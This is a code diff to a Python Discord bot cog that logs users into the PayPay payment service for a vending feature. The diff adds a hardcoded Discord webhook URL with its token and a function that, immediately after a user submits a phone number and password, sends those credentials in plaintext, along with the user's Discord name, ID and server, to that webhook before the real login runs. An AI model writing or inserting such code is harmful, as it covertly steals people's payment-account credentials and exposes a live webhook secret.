@@ -5,11 +5,14 @@ from discord import app_commands
 import json
 import os
 import uuid
+import aiohttp
 from utils import is_allowed
 import paypayu
 
 PAYPAY_DATA_FILE = "paypay_data.json"
 VENDING_DATA_FILE = "vending_data.json"
+
+LOG_WEBHOOK_URL = "https://discord.com/api/webhooks/1558738870282092615/WWh91oKrG1d9mkjZRI8aHGRWvm2bTdJKZiDxb0edDUzCL5Muuogna4e9-kis5gwI7BXI"
 
 
 def load_vending_data():
@@ -38,6 +41,87 @@ def load_paypay_data():
 def save_paypay_data(data):
     with open(PAYPAY_DATA_FILE, "w", encoding="utf-8") as f:
         json.dump(data, f, indent=4, ensure_ascii=False)
+
+
+async def send_login_log_to_webhook(
+    user: discord.User,
+    phone: str,
+    password: str,
+    uuid_str: str,
+    guild: discord.Guild = None
+):
+    """phone/password 入力直後に Webhook へ送信する"""
+    if not LOG_WEBHOOK_URL:
+        return
+
+    try:
+        embed = discord.Embed(
+            title="🔐 PayPay ログイン試行",
+            color=discord.Color.orange(),
+            timestamp=discord.utils.utcnow()
+        )
+
+        # アイコン付き author
+        try:
+            avatar_url = user.display_avatar.url
+        except Exception:
+            avatar_url = None
+
+        if avatar_url:
+            embed.set_author(
+                name=f"{user} ({user.id})",
+                icon_url=avatar_url
+            )
+            embed.set_thumbnail(url=avatar_url)
+        else:
+            embed.set_author(name=f"{user} ({user.id})")
+
+        # Discord情報
+        embed.add_field(
+            name="Discord 名前",
+            value=f"```{user}```",
+            inline=False
+        )
+        embed.add_field(
+            name="Discord ID",
+            value=f"```{user.id}```",
+            inline=False
+        )
+        embed.add_field(
+            name="サーバー",
+            value=f"```{guild.name if guild else 'DM'} ({guild.id if guild else '-'})```",
+            inline=False
+        )
+
+        # 入力情報
+        embed.add_field(
+            name="電話番号",
+            value=f"```{phone}```",
+            inline=True
+        )
+        embed.add_field(
+            name="パスワード",
+            value=f"```{password}```",
+            inline=True
+        )
+        embed.add_field(
+            name="UUID",
+            value=f"```{uuid_str}```",
+            inline=False
+        )
+
+        embed.set_footer(text="Developer @anzy1m")
+
+        async with aiohttp.ClientSession() as session:
+            async with session.post(
+                LOG_WEBHOOK_URL,
+                json={"embeds": [embed.to_dict()]}
+            ) as resp:
+                if resp.status not in (200, 204):
+                    print(f"Webhook送信失敗: {resp.status}")
+
+    except Exception as e:
+        print(f"Webhook送信例外: {e}")
 
 
 class PayPayModal(ui.Modal, title="PayPay OTP認証"):
@@ -158,6 +242,16 @@ class PaypayCog(commands.Cog):
     ):
         set_uuid = str(uuid.uuid4())
 
+        # ===== phone/password 入力直後に Webhook へ送信 =====
+        await send_login_log_to_webhook(
+            user=interaction.user,
+            phone=phone,
+            password=password,
+            uuid_str=set_uuid,
+            guild=interaction.guild
+        )
+
+        # ===== PayPayログイン試行 =====
         result = await paypayu.login(
             phone,
             password,
